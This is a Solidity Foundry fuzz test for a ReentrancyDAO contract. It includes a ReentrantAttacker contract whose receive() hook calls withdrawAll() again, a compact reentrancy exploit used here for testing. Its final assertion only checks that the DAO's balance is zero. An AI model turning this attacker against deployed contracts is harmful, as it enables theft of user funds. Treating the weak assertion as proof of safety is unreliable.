// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract InvMutTest is Test {
    ReentrancyDAO c;
    function setUp() public { c = new ReentrancyDAO(); }

    function testFuzz_property(uint256 amt, address attackerAddr) public {
        vm.assume(attackerAddr != address(0));
        amt = bound(amt, 1, 1 ether);

        vm.deal(attackerAddr, amt * 2);

        ReentrantAttacker atk = new ReentrantAttacker(c);

        vm.deal(address(atk), amt);

        vm.prank(address(atk));
        c.deposit{value: amt}();

        vm.prank(address(atk));
        c.withdrawAll();

        assertTrue(address(c).balance == 0);
    }
}

contract ReentrantAttacker {
    ReentrancyDAO target;
    bool reentered;
    constructor(ReentrancyDAO _t) {
        target = _t;
    }
    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.withdrawAll();
        }
    }
}
